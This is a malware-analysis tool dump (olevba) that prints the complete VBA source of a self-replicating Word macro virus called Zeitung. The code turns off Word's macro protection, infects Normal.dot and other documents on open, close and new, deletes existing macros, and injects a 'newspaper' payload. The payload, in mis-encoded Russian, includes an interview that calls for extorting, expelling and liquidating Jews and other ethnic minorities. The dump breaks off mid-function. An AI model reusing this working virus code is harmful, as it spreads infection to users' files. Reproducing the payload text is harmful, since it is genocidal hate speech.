olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zeitung-7a4b70c8e6e23065c4bae8d8b2b337f6221cc2e9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zeitung-7a4b70c8e6e23065c4bae8d8b2b337f6221cc2e9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const E_Marker = "VirusZeitung" 'ñèãíàòóðà âèðóñà
'èó îäë:ÀêäéÔíðâêé ëêàä ôåî  èàëØòëâ@Âðññçàè ðàè èàåñè,ÀåñíðÅðìâèÌõè ààî
'1
'íîìåð 1 çà 2000 ãîä
Dim ad, nt As Object
Dim sd, snt As Boolean
 
Private Function NormalKontam()
 If Not nt.codemodule.Find(E_Marker, 1, 1, 10000, 10000) Then
  NormalKontam = 0
 Else
  If nt.codemodule.countoflines < 3 Then
   NormalKontam = 0
  Else
   ant$ = Trim(nt.codemodule.lines(3, nt.codemodule.countoflines))
   ant$ = Mid(ant$, 2, Len(ant$) - 1)
   If Val(Trim(ant$)) < 65535 Then
    NormalKontam = Val(Trim(ant$))
   Else
    NormalKontam = -1
   End If
  End If
 End If
End Function

Private Function ADokumKontam()
 If Not ad.codemodule.Find(E_Marker, 1, 1, 10000, 10000) Then
  ADokumKontam = 0
 Else
  If ad.codemodule.countoflines < 3 Then
   ADokumKontam = 0
  Else
   ant$ = Trim(ad.codemodule.lines(3, ad.codemodule.countoflines))
   ant$ = Mid(ant$, 2, Len(ant$) - 1)
   If Val(Trim(ant$)) < 65535 Then
    ADokumKontam = Val(Trim(ant$))
   Else
    ADokumKontam = -1
   End If
  End If
 End If
End Function

Private Sub VirusArbeit()
 On Error Resume Next
 Options.VirusProtection = False
 Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
 Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
 If (ADokumKontam < NormalKontam) And ((ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate)) Then
  sd = ActiveDocument.Saved
  If ad.codemodule.countoflines > 0 Then
   Open "C:\" + ActiveDocument.ActiveWindow.Caption + ".TXT" For Append As #1
   Print #1, "Ìàêðîñû, áûâøèå â äîêóìåíòå äî âíåäðåíèÿ âèðóñà"
   For v = 1 To ad.codumodule.countoflines
    Print #1, ad.codemodule.lines(v, 1)
   Next v
   Close #1
   ad.codemodule.deletelines 1, ad.codemodule.countoflines
  End If
  For v = 1 To nt.codemodule.countoflines
   ad.codemodule.insertlines v, nt.codemodule.lines(v, 1)
  Next v
  If (sd = True) And (Mid(ActiveDocument.ActiveWindow.Caption, 1, 8) <> "Äîêóìåíò") Then ActiveDocument.Save
 End If
 
 If ADokumKontam > NormalKontam Then
  snt = NormalTemplate.Saved
  If nt.codemodule.countoflines > 0 Then
   Open "C:\NORMAL.TXT" For Append As #1
   Print #1, "Ìàêðîñû, áûâøèå â øàáëîíå Normal.dot"
   For v = 1 To nt.codemodule.countoflines
    Print #1, nt.codemodule.lines(v, 1)
   Next v
   Close #1
   nt.codemodule.deletelines 1, nt.codemodule.countoflines
  End If
  For v = 1 To ad.codemodule.countoflines
   nt.codemodule.insertlines v, ad.codemodule.lines(v, 1)
  Next v
  If snt = True Then NormalTemplate.Save
 End If
 Set nt = Nothing
 Set ad = Nothing
End Sub

Private Sub HauptArbeit(p)
 Tag$ = ""
 Monat$ = ""
 datum$ = Trim(Date)
 i = 1
 While (Mid(datum$, i, 1) <> ".") And (i < Len(datum$))
  Tag$ = Tag$ + Mid(datum$, i, 1)
  i = i + 1
 Wend
 i = i + 1
 While (Mid(datum$, i, 1) <> ".") And (i < Len(datum$))
  Monat$ = Monat$ + Mid(datum$, i, 1)
  i = i + 1
 Wend
 
 If (Val(Monat$) = 2) And (Val(Tag$) = 2) Then
  p = 2
 End If
 If (Val(Monat$) = 3) And (Val(Tag$) = 21) Then
  p = 2
 End If
 If (Val(Monat$) = 4) And (Val(Tag$) = 30) Then
  p = 2
 End If
 If (Val(Monat$) = 6) And (Val(Tag$) = 21) Then
  p = 2
 End If
 If (Val(Monat$) = 8) And (Val(Tag$) = 2) Then
  p = 2
 End If
 If (Val(Monat$) = 9) And (Val(Tag$) = 21) Then
  p = 2
 End If
 If (Val(Monat$) = 10) And (Val(Tag$) = 31) Then
  p = 2
 End If
 If (Val(Monat$) = 12) And (Val(Tag$) = 21) Then
  p = 2
 End If
  
 If Rnd >= p Then
  Exit Sub
 End If
 Z_Kopf
 
 Druck_0 Artikel_1$(1, 0), 18, True, wdAlignParagraphCenter, 0
 Selection.TypeParagraph
 ab_ = 0
 While Artikel_1$(2, ab_) <> ""
  Druck_0 Artikel_1$(2, ab_), 14, False, wdAlignParagraphJustify, 1.5
  ab_ = ab_ + 1
 Wend
 Selection.TypeParagraph
 Druck_0 Artikel_1$(3, 0), 14, True, wdAlignParagraphRight, 0
 Selection.TypeParagraph
 
 Druck_0 Artikel_2$(1, 0), 18, True, wdAlignParagraphCenter, 0
 Selection.TypeParagraph
 ab_ = 0
 While Artikel_2$(2, ab_) <> ""
  Druck_0 Artikel_2$(2, ab_), 14, False, wdAlignParagraphJustify, 1.5
  ab_ = ab_ + 1
 Wend
 Selection.TypeParagraph
 Druck_0 Artikel_2$(3, 0), 14, True, wdAlignParagraphRight, 0
 Selection.TypeParagraph
 
 Druck_0 Artikel_3$(1, 0), 18, True, wdAlignParagraphCenter, 0
 Selection.TypeParagraph
 ab_ = 0
 While Artikel_3$(2, ab_) <> ""
  Druck_0 Artikel_3$(2, ab_), 14, ab_ / 2 <> Int(ab_ / 2), wdAlignParagraphJustify, 1.5
  ab_ = ab_ + 1
 Wend
 Selection.TypeParagraph
 Druck_0 Artikel_3$(3, 0), 14, True, wdAlignParagraphRight, 0
 Selection.TypeParagraph
 
 Z_Sub
End Sub

Private Sub Document_Close()
 VirusArbeit
 HauptArbeit (0.1)
End Sub

Private Sub Document_New()
 VirusArbeit
 HauptArbeit (0.1)
End Sub

Private Sub Document_Open()
 VirusArbeit
 HauptArbeit (0.1)
End Sub

Private Sub Z_Kopf()
 Druck_0 "À Ä Ñ Ê È É   Î Ã Î Í Ü", 40, True, wdAlignParagraphCenter, 0
 Druck_0 "Âèðóñíàÿ ãàçåòà ñåêòû èì. Äæ. Äè è Ý. Êåëëè.", 18, False, wdAlignParagraphLeft, 0
 Druck_0 "Âûõîä ïî ìåðå êîìïëåêòîâàíèÿ íîìåðà", 18, False, wdAlignParagraphLeft, 0
 Druck_0 "5  ÿíâàðÿ  2000  ã.   ¹ 1 (1)", 18, False, wdAlignParagraphLeft, 0
 Selection.TypeParagraph
 Druck_0 "Ñåãîäíÿ â íîìåðå:", 18, True, wdAlignParagraphLeft, 0
 Druck_0 "* " + Artikel_1$(1, 0), 18, False, wdAlignParagraphLeft, 0
 Druck_0 "* " + Artikel_2$(1, 0), 18, False, wdAlignParagraphLeft, 0
 Druck_0 "* " + Artikel_3$(1, 0), 18, False, wdAlignParagraphLeft, 0
 Selection.TypeParagraph
 Druck_0 "******************************", 18, True, wdAlignParagraphCenter, 0
 Selection.TypeParagraph
 Selection.TypeParagraph
End Sub

Private Sub Z_Sub()
 Selection.TypeParagraph
 Selection.TypeParagraph
 Druck_0 "*************************************", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Ó÷ðåäèòåëü - ñàòàíèíñêàÿ ñåêòà èìåíè Äæîíà Äè è Ýäâàðäà Êåëëè", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Ãëàâíûé ðåäàêòîð - Â. Ä. Òàðàñêèí", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Äèðåêòîð - Ã. Ñ. Ëèñóíîâ", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Àâòîð èäåè - À. Í. Ãåíîâà", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Êîíñóëüòàíò ïî âîïðîñàì âèðóñîëîãèè -  Ï. Â. Íîãèí", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Ãëàâíûé ïðîãðàììèñò - À. Â. Ðûæîâ", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Êîìïüþòåðíûé íàáîð è îôîðìëåíèå - Ò. Â. Çóáîâà", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Ìíåíèå ðåäàêöèè ìîæåò íå ñîâïàäàòü ñ ïîçèöèåé àâòîðîâ ïóáëèêàöèé.", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Ïðè ïåðåïå÷àòêå è èñïîëüçîâàíèè ìàòåðèàëîâ ññûëêà íà ãàçåòó íåîáÿçàòåëüíà.", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Ðåäàêöèÿ íå íåñåò îòâåòñòâåííîñòè çà ñîäåðæàíèå ïóáëèêóåìûõ ìàòåðèàëîâ.", 14, False, wdAlignParagraphCenter, 0
End Sub

Private Sub Druck_0(T As String, Siz, Bld, Alg, Ind)
 Selection.Font.Size = Siz
 Selection.Font.Bold = Bld
 Selection.ParagraphFormat.Alignment = Alg
 Selection.ParagraphFormat.FirstLineIndent = CentimetersToPoints(Ind)
 Selection.TypeParagraph
 Selection.TypeText Text:=T
End Sub

Private Function Artikel_1$(T, Ab)
 If T = 1 Then
  Artikel_1$ = "ÐÎÆÄÅÍÈÅ  ÍÎÂÎÃÎ  ÈÇÄÀÍÈß"
 End If
 If T = 2 Then
  Select Case Ab
   Case 0
    Artikel_1$ = "Óâàæàåìûå ÷èòàòåëè! Âû ïðèñóòñòâóåòå ïðè óíèêàëüíîì ñîáûòèè: ðîæäàåòñÿ íå ïðîñòî íîâîå èçäàíèå, êàê ñëåäóåò èç çàãîëîâêà, à ïðèíöèïèàëüíî íîâûé òèï ïåðèîäè÷åñêîãî èçäàíèÿ - âèðóñíàÿ ãàçåòà. Â íûíåøíåå âðåìÿ èíôîðìàöèîííûå òåõíîëîãèè ïðî÷íî âîøëè â íàø áûò; ïî÷òè êàæäûé ÷åëîâåê çíàåò, ÷òî òàêîå êîìïüþòåð, èëè äàæå èìååò åãî ó ñåáÿ äîìà; ìû íå ìûñëèì ñâîåé æèçíè áåç Internet'à. Âñå çíàþò (õîòÿ áû ïîíàñëûøêå) î êîìïüþòåðíûõ âèðóñàõ, è ñîçäàâàåìûõ èìè ïðîáëåìàõ. Äî ñèõ ïîð áûòîâàëî ìíåíèå, ÷òî êîìïüþòåðíûé âèðóñ ìîæåò ïðèíîñèòü òîëüêî âðåä, îäíàêî ìû ïîñòàâèëè ñâîåé öåëüþ îïðîâåðãíóòü äàííîå çàÿâëåíèå, íàéäÿ âèðóñó ïîëåçíîå ïðèìåíåíèå."
   Case 1
    Artikel_1$ = "Êàê èçâåñòíî, âî âñå âðåìåíà ñðåäñòâà ìàññîâîé èíôîðìàöèè (çäåñü è äàëåå - ÑÌÈ) èãðàëè âàæíóþ ðîëü â æèçíè îáùåñòâà. Îñîáûì ñïðîñîì ïîëüçóþòñÿ ÑÌÈ, íå êîíòðîëèðóåìûå ðàçíîãî ðîäà âëàñòíûìè ñòðóêòóðàìè, à òàêæå íå ïðåäúÿâëÿþùèå ïîâûøåííûõ òðåáîâàíèé ê ñâîèì ÷èòàòåëÿì. Ê ïðèìåðó: ìíîãèå õîòÿò ïîìåùàòü ñâîè îáúÿâëåíèÿ àíîíèìíî è ïî âîçìîæíîñòè áåñïëàòíî, ïóáëèêîâàòü ïîä âûìûøëåííûì èìåíåì èëè àíîíèìíî ìàòåðèàëû ëþáîãî îáúåìà è ñîäåðæàíèÿ è ò.ï. Îôèöèàëüíûå èçäàíèÿ äåëàþò òàêîå íåâîçìîæíûì èëè êðàéíå çàòðóäíÿþò, ÷åì âûçûâàþò çàêîííóþ íåïðèÿçíü ó áîëüøèíñòâà ãðàæäàí. Íàøà ãàçåòà  íå èìååò äàííûõ íåäîñòàòêîâ, òàê êàê ÿâëÿåòñÿ íåëåãàëüíîé, è êàê ñëåäñòâèå - ïîäïîëüíîé. Ïîäïîëüíûå ãàçåòû ñóùåñòâîâàëè è ðàíåå, îäíàêî èõ èçäàíèå è ðàñïðîñòðàíåíèå áûëî ñâÿçàíî ñ áîëüøèì ðèñêîì êàê äëÿ ÷èòàòåëåé, òàê è äëÿ èçäàòåëåé. " & _
    "Òî æå ñàìîå ìîæíî ñêàçàòü è î ðàñïðîñòðàíåíèè ëèñòîâîê. Ýòè íåäîñòàòêè ìîãóò áûòü óñòðàíåíû ïðè ïîìîùè ïåðåâîäà ãàçåòû íà íîâóþ îñíîâó, èñêëþ÷àþùóþ èëè ñâîäÿùóþ ê ìèíèìóìó êîíòàêò ÷èòàòåëåé ñ èçäàòåëüñòâîì. Â êà÷åñòâå òàêîé îñíîâû áûëî ðåøåíî èñïîëüçîâàòü êîìïüþòåðíûé âèðóñ, òàê êàê îí ñïîñîáåí ðàñïðîñòðàíÿòüñÿ áåç âìåøàòåëüñòâà ÷åëîâåêà âåçäå, ãäå åñòü âîñïðèèì÷èâûå ê íåìó êîìïüþòåðû."
   Case 2
    Artikel_1$ = "Êàê èçâåñòíî, êîìïüþòåðíûå âèðóñû êëàññèôèöèðóþòñÿ ïî íåñêîëüêèì ïðèçíàêàì, â ÷àñòíîñòè, ïî ñòåïåíè ïðè÷èíÿåìîãî èìè âðåäà. Âèðóñû, íàçûâàåìûå ""áåçâðåäíûìè"", òîëüêî ðàçìíîæàþòñÿ è çàíèìàþò ïàìÿòü; òàê íàçûâàåìûå ""íåîïàñíûå"" âèðóñû â äîïîëíåíèå ê  ïåðå÷èñëåííîìó ïðîèçâîäÿò ðàçëè÷íûå çâóêîâûå, ãðàôè÷åñêèå è ïðî÷èå ýôôåêòû. Îñòàëüíûå ðàçíîâèäíîñòè âèðóñîâ ìû íå áóäåì ðàññìàòðèâàòü, òàê êàê îíè íå ïîòðåáóþòñÿ äëÿ äàëüíåéøåãî îáúÿñíåíèÿ. Äî ñèõ ïîð âèðóñû, îòíîñèìûå ê ""íåîïàñíûì"", âûâîäèëè òîëüêî ñîîáùåíèÿ, íå èìåþùèå â áîëüøèíñòâå ñëó÷àåâ, íèêàêîé ïðàêòè÷åñêîé öåííîñòè; îäíàêî, íå òðåáóåò äîêàçàòåëüñòâ, ÷òî òàêîé âèðóñ â ïðèíöèïå ìîæåò âûâåñòè íà ýêðàí òåêñò ãàçåòû èëè ëèñòîâêè. Ñòîèò òîëüêî îñíàñòèòü âèðóñ òàêîé ""íà÷èíêîé"", è îí ñòàíîâèòñÿ ñîîòâåòñòâåííî ãàçåòîé èëè ëèñòîâêîé, êîòîðàÿ ðàñïðîñòðàíÿåò ñåáÿ ñàìà. Ïðè ýòîì âîçíèêàåò ñëåäóþùàÿ ïðîáëåìà: ãàçåòà âûõîäèò ïåðèîäè÷åñêè, è åå íîâûå íîìåðà äîëæíû âûòåñíÿòü èç ñðåäû îáèòàíèÿ ñòàðûå. Ïîäîáíîå íå ÿâëÿåòñÿ íåâîçìîæíûì äëÿ " & _
    "êîìïüþòåðíûõ âèðóñîâ: íåêîòîðûå èç íèõ ñíàáæåíû ìåõàíèçìîì îáíîâëåíèÿ âåðñèè, ÷òî ïðè ñîîòâåòñòâóþùåé äîðàáîòêå ìîæåò áûòü ïðèìåíåíî äëÿ çàìåíû ñòàðîãî íîìåðà ãàçåòû íîâûì. Äëÿ ðåàëèçàöèè òàêîé ãàçåòû íåîáõîäèìî âûáðàòü ñðåäó îáèòàíèÿ âèðóñà. Íàèáîëåå öåëåñîîáðàçíûì ïðåäñòàâëÿåòñÿ ðàñïðîñòðàíåíèå ïîäïîëüíîé ãàçåòû ïðè ïîìîùè ìàêðîâèðóñà, òàê êàê â íàñòîÿùåå âðåìÿ ÷àùå âñåãî ñ êîìïüþòåðà íà êîìïüþòåð ïåðåíîñÿò äîêóìåíòû è ýëåêòðîííûå òàáëèöû, êîòîðûå ÿâëÿþòñÿ ñðåäîé îáèòàíèÿ òàêèõ âèðóñîâ."
   Case 3
    Artikel_1$ = "Íàøà ñåêòà áûëà ñîçäàíà â 1991 ãîäó, îäíàêî äî ñèõ ïîð íå èìåëà ñâîåãî ïå÷àòíîãî îðãàíà, ÷òî ÿâëÿåòñÿ ñåðüåçíûì íåäîñòàòêîì. Èíîãäà ìû ïî ðàçíûì ïîâîäàì ïèñàëè â ðàçëè÷íûå ãàçåòû, íî íàøè ìàòåðèàëû óïîðíî íå ïóáëèêîâàëèñü, çà èñêëþ÷åíèåì îäíîãî ðàçà. Òåïåðü ìû ðåøèëè äàííóþ ïðîáëåìó ïóòåì ñîçäàíèÿ ñîáñòâåííîé âèðóñíîé ãàçåòû. Íå ñëåäóåò äóìàòü, îäíàêî, ÷òî çäåñü áóäóò ïå÷àòàòüñÿ òîëüêî ìàòåðèàëû íàøèõ ñåêòàíòîâ; íàîáîðîò, ìû ñòàðàåìñÿ áûòü îòêðûòûìè äëÿ âñåõ, âíå çàâèñèìîñòè îò âåðîèñïîâåäàíèÿ, íàöèîíàëüíîñòè è ïîëèòè÷åñêèõ óáåæäåíèé. Ãàçåòà âûõîäèò ïî ìåðå êîìïëåêòîâàíèÿ íîìåðà. Â áëèæàéøåì áóäóùåì áóäåò îïóáëèêîâàí ñïîñîá ñâÿçè ñ íàøåé ðåäàêöèåé, êîòîðûì ñìîæåò âîñïîëüçîâàòüñÿ êàæäûé, êòî çíàêîì ñ ÿçûêîì ïðîãðàììèðîâàíèÿ Visual Basic. Äëÿ òåõ, êòî íå çíàêîì ñ ïðîãðàììèðîâàíèåì, â ãîðîäå èìååòñÿ ñåòü êîððåñïîíäåíòîâ."
   Case 4
    Artikel_1$ = "Áîëåå ïîäðîáíî î âèðóñå ðàññêàæåò íèæå íàø ãëàâíûé ïðîãðàììèñò Àëåêñàíäð Ðûæîâ."
   Case Else
    Artikel_1$ = ""
  End Select
 End If
 If T = 3 Then
  Artikel_1$ = "Ãëàâíûé ðåäàêòîð    Â. Ä. Òàðàñêèí"
 End If
End Function

Private Function Artikel_2$(T, Ab)
 If T = 1 Then
  Artikel_2$ = "ÃÀÇÅÒÍÛÉ ÂÈÐÓÑ: ×ÒÎ ÝÒÎ ÒÀÊÎÅ ?"
 End If
 If T = 2 Then
  Select Case Ab
   Case 0
    Artikel_2$ = "Ñðàçó ñïåøó óñïîêîèòü íàøèõ ÷èòàòåëåé: âèðóñ, ðàñïðîñòðàíÿþùèé ãàçåòó ""Àäñêèé îãîíü"", íå èìååò íèêàêèõ âñòðîåííûõ äåñòðóêòèâíûõ ôóíêöèé è íå ñîäåðæèò îøèáîê, çàòðóäíÿþùèõ ðàçìíîæåíèå èëè óãðîæàþùèõ ðàçðóøåíèåì äàííûõ."
   Case 1
    Artikel_2$ = "Âèðóñ, êîòîðûé ìû óñëîâíî íàçûâàåì ""Inferno"", ïðåäñòàâëÿåò ñîáîé ìàêðîâèðóñ, ïîðàæàþùèé äîêóìåíòû â ôîðìàòå Microsoft Word. Îí ñîñòîèò èç ðÿäà ïðîöåäóð, êîòîðûå îáåñïå÷èâàþò åãî ðàçìíîæåíèå, ñìåíó ñòàðîãî íîìåðà íîâûì, ñîáñòâåííî ïå÷àòü ìàòåðèàëîâ, à òàêæå àâòîìàêðîñû, çàïóñêàåìûå ïðè îòêðûòèè, çàêðûòèè è ñîçäàíèè íîâîãî ôàéëà. Ïåðâàÿ ñòðîêà ñîäåðæèò ñèãíàòóðó âèðóñà, âòîðàÿ - àâòîðñêèé çíàê, à òðåòüÿ - ñòðîêîâóþ çàïèñü íîìåðà ãàçåòû. Âî âòîðîé ñòðîêå çàêîäèðîâàíû èìåíà è ôàìèëèè àâòîðîâ âèðóñà, êîòîðûå ïðîäàëè íàì òåêñò ïðîãðàììû è ïîæåëàëè îñòàòüñÿ íåèçâåñòíûìè."
   Case 2
    Artikel_2$ = "Ïðè îòêðûòèè çàðàæåííîãî ôàéëà îòêëþ÷àåòñÿ ïðîâåðêà äîêóìåíòîâ íà ïðåäìåò íàëè÷èÿ ìàêðîñîâ, ïðîèñõîäèò çàðàæåíèå øàáëîíà NORMAL.DOT (åñëè îí íå çàðàæåí, èëè çàðàæåí áîëåå ðàííèì íîìåðîì ãàçåòû). Åñëè øàáëîí óæå ñîäåðæèò êàêèå-ëèáî ìàêðîñû, òî îíè ïåðåíîñÿòñÿ â òåêñòîâûé ôàéë NORMAL.TXT. Åñëè ôàéë ñ òàêèì èìåíåì óæå ñóùåñòâóåò, òî ïåðåíîñèìûå ìàêðîñû äîáàâëÿþòñÿ ê íåìó."
   Case 3
    Artikel_2$ = "Çàòåì êàæäûé íîâûé ôàéë, îñíîâàííûé íà ýòîì øàáëîíå áóäåò çàðàæàòüñÿ ïðè ñîçäàíèè è ïðè çàêðûòèè. Åñëè îí óæå ñîäåðæèò êàêèå-íèáóäü ìàêðîñû, òî îíè òàêæå ïåðåíîñÿòñÿ â òåêñòîâûé ôàéë (*.TXT), èìÿ êîòîðîãî ñîâïàäàåò ñ èìåíåì ôàéëà äîêóìåíòà."
   Case 4
    Artikel_2$ = "Â çàâèñèìîñòè îò ñëó÷àéíîãî ñ÷åò÷èêà (â îïðåäåëåííûå äíè îáÿçàòåëüíî) â ðåäàêòèðóåìûé äîêóìåíò âñòàâëÿåòñÿ òåêñò ãàçåòû."
   Case Else
    Artikel_2$ = ""
  End Select
 End If
 If T = 3 Then
  Artikel_2$ = "Ãëàâíûé ïðîãðàììèñò ñåêòû   À. Â. Ðûæîâ"
 End If
End Function

Private Function Artikel_3$(T, Ab)
 If T = 1 Then
  Artikel_3$ = "ÃÄÅ  ÆÅ  ÂÛ,  ÐÓÑÑÊÈÅ  ?"
 End If
 If T = 2 Then
  Select Case Ab
   Case 0
    Artikel_3$ = "Ïåðâûé ìàòåðèàë, îïóáëèêîâàííûé â íàøåé ãàçåòå, ïîñâÿùåí íàöèîíàëüíîìó âîïðîñó. Íàø êîððåñïîíäåíò Ì. Â. ×óðèëîâ áåñåäóåò ñ ãëàâîé àñòðàõàíñêîãî ôèëèàëà ""Ðóññêîãî íàöèîíàëüíîãî åäèíñòâà""."
   Case 1
    Artikel_3$ = "- Íàçîâèòå, ïîæàëóéñòà ñåáÿ."
   Case 2
    Artikel_3$ = "- Ââèäó îïàñíîñòè ìîåé ðàáîòû ÿ íå ìîãó íàçâàòü ñâîå íàñòîÿùåå èìÿ; ó ìåíÿ åñòü ïñåâäîíèì, êîòîðûé ÿ âàì ñîîáùó: Ñàïóãèí Åâãåíèé Àíàòîëüåâè÷. Òàê ìåíÿ è çîâèòå."
   Case 3
    Artikel_3$ = "- Èìÿ è îò÷åñòâî íàñòîÿùèå ?"
   Case 4
    Artikel_3$ = "- Îá ýòîì äîãàäûâàéòåñü ñàìè."
   Case 5
    Artikel_3$ = "- ×òî âû ïîäðàçóìåâàåòå ïîä ""ðàáîòîé"", êîòîðàÿ ñîïðÿæåíà ñ òàêîé îïàñíîñòüþ ?"
   Case 6
    Artikel_3$ = "- Ãëàâíàÿ öåëü íàøåé îðãàíèçàöèè ñîñòîèò â òîì, ÷òîáû î÷èñòèòü Ðîññèþ îò ðàçíîãî ðîäà ýòíè÷åñêîãî ìóñîðà, êîòîðûé çàãëóøàåò âñå èñêîííî ðóññêîå, è íå äàåò ñòðàíå íîðìàëüíî æèòü. Ýòîò ìóñîð íå õî÷åò áûòü âûìåòåííûì, è ïûòàåòñÿ ðàçäåëàòüñÿ ñ íàìè, â ñâÿçè  ñ ÷åì ïðåäñòàâëÿåò áîëüøóþ îïàñíîñòü. Åñëè âû âíèìàòåëüíî ïðèãëÿíåòåñü ê òåïåðåøíåé ñèòóàöèè, òî íå ìîæåòå íå çàìåòèòü, ÷òî ïî÷òè íà êàæäîì êëþ÷åâîì ïîñòó, èìåþùåì õîòü êàêîå-òî çíà÷åíèå, ñèäèò êàêîé-íèáóäü èíîðîäåö (÷àùå âñåãî - åâðåé) è âüåò âåðåâêè èç íàñòîÿùèõ ðóññêèõ. Íå çàáûâàéòå, ÷òî ìû - ãîñóäàðñòâîîáðàçóþùàÿ íàöèÿ, è äîëæíû çàùèùàòüñÿ îò òàêîé ïàäàëè âñåìè äîñòóïíûìè è íåäîñòóïíûìè ñðåäñòâàìè."
   Case 7
    Artikel_3$ = "- Êàêèå ñðåäñòâà Âû èìååòå â âèäó?"
   Case 8
    Artikel_3$ = "- Â íà÷àëå íàì ïðèäåòñÿ äåéñòâîâàòü íåëåãàëüíûìè ìåòîäàìè. Èíîðîäöû ñèäÿò âåçäå è ïûòàþòñÿ âñåìè ñðåäñòâàìè îòòåñíèòü íàñ îò ðû÷àãîâ óïðàâëåíèÿ; íàãëÿäíûì ïðèìåðîì òîãî ÿâëÿåòñÿ çàïðåùåíèå ïàðòèè ""Ðóññêîå íàöèîíàëüíîå åäèíñòâî"" è îòìåíà ðåãèñòðàöèè äâèæåíèÿ ""Ñïàñ"". Çà ýòî îíè äîëæíû ïîíåñòè è ïîíåñóò ñóðîâîå íàêàçàíèå, íî ñíà÷àëà èç íèõ íåîáõîäèìî âûæàòü âñå, ÷òî ìîæåò ïîéòè íà ïîëüçó Ðîññèè, òî åñòü äåíüãè, èìóùåñòâî, çíàíèÿ, îïûò è ìíîãîå äðóãîå. Ïîñêîëüêó îíè íå îòäàäóò íè÷åãî äîáðîâîëüíî, íàì ïðèäåòñÿ âçÿòü ýòî ñèëîé. Âñå áîãàòûå åâðåè è ïðî÷èå èíîðîäöû äîëæíû áûòü â íà÷àëå îáëîæåíû íàëîãîì íà ïðàâî æèòü â Ðîññèè èëè ïðèâëåêàòüñÿ ê ðàçíîãî ðîäà ïðèíóäèòåëüíûì âèäàì äåÿòåëüíîñòè. Çà îòêàç îò óïëàòû äîëæíà ñëåäîâàòü ðàñïðàâà íàä äîëæíèêîì èëè åãî ðîäíûìè."
   Case 9
    Artikel_3$ = "- Ïðàâèëüíî ëè ÿ ïîíÿë, ÷òî Âû ïðåäëàãàåòå îáû÷íûé ðýêåò âñåõ ñîñòîÿòåëüíûõ èíîðîäöåâ ?"
   Case 10
    Artikel_3$ = "- Äà, íåêîòîðûå íàçûâàþò ýòî òàêèì îáðàçîì."
   Case 11
    Artikel_3$ = "- À êàê âû îòíîñèòåñü ê ðóññêèì, ñîñòîÿùèì â ñìåøàííûõ áðàêàõ?"
   Case 12
    Artikel_3$ = "- ß ñ÷èòàþ òàêèõ ëþäåé ïðåäàòåëÿìè ñâîåé íàöèè, êîòîðûå çàñîðÿþò ãåíîôîíä ðóññêîãî íàðîäà ðàçíûì äåðüìîì; îíè äîëæíû îáëàãàòüñÿ íàðàâíå ñ âûøåóïîìÿíóòûìè êàòåãîðèÿìè ãðàæäàí. Ðîæäåííûå â òàêèõ áðàêàõ äåòè-ïîëóêðîâêè ïîäëåæàò òîìó æå îáëîæåíèþ."
   Case 13
    Artikel_3$ = "- Êàê ïîíèìàòü ñëîâî ""ïîëóêðîâêè"" ?  Íå ïûòàåòåñü ëè Âû ââåñòè êóëüò ""÷èñòîòû êðîâè"", âîñïåòûé êîãäà-òî Ãèòëåðîì è åãî ïîäðó÷íûìè?"
   Case 14
    Artikel_3$ = "- ""×èñòîòà êðîâè"" åñòü íàøà ïðîãðàììà-ìàêñèìóì, îäíàêî äî íåå íàì åùå î÷åíü äàëåêî. Äåëî â òîì, ÷òî íàø ãåíîôîíä ñèëüíî çàñîðåí, è åãî î÷èñòêà ïîòðåáóåò íåìàëîãî âðåìåíè; ñåé÷àñ ìû äîëæíû îñòàíîâèòü, íàñêîëüêî ýòî âîçìîæíî, ïðîöåññ åãî äàëüíåéøåãî çàñîðåíèÿ. Îñîáåííî îïàñíû â ýòîì îòíîøåíèè åâðåè: ýòîò íàðîä äîëãîå âðåìÿ ïîäâåðãàë ñåáÿ èíáðèäèíãó, â ðåçóëüòàòå ÷åãî íàêîïèë ãðîìàäíîå êîëè÷åñòâî îïàñíûõ, âïëîòü äî ëåòàëüíûõ ãåíîâ. Îíè â ïåðâóþ î÷åðåäü äîëæíû áûòü âûñëàíû çà ïðåäåëû Ðîññèè èëè ëèêâèäèðîâàíû. ×òî æå êàñàåòñÿ Ãèòëåðà, òî êóëüò ""÷èñòîòû êðîâè"" è ãåíîöèä åâðååâ ïðèäóìàëè çàäîëãî äî íåãî; îí òîëüêî óñîâåðøåíñòâîâàë ýòî."
   Case 15
    Artikel_3$ = "- Êàêèå êîíêðåòíûå äåéñòâèÿ âû ïðåäïðèíèìàåòå â äàííîì íàïðàâëåíèè ?"
   Case 16
    Artikel_3$ = "- Ìû îòîáðàëè íàèáîëåå ÷èñòîêðîâíûõ ëþäåé ñðåäè ñâîèõ ÷ëåíîâ, è ïûòàåìñÿ âîçðîäèòü ñâîé èñêîííûé ãåíîôîíä, íàñêîëüêî ýòî äîïóñêàåò âîçìîæíîñòü. Äåíüãè, íåîáõîäèìûå äëÿ íàøåé äåÿòåëüíîñòè, áóäåì âûêîëà÷èâàòü èç ñîñòîÿòåëüíûõ åâðååâ, òàòàð è ïðî÷èõ âûðîäêîâ, ïî íåäîðàçóìåíèÿ îêàçàâøèõñÿ â ýòîé ñòðàíå."
   Case 17
    Artikel_3$ = "- Âàì íå êàæåòñÿ, ÷òî â Àñòðàõàíè òàêàÿ çàäà÷à ìîæåò îêàçàòüñÿ ÷ðåçâû÷àéíî òðóäíîé, âåäü ïðîöåíò ðóññêèõ  çäåñü âåñüìà íåâåëèê ?"
   Case 18
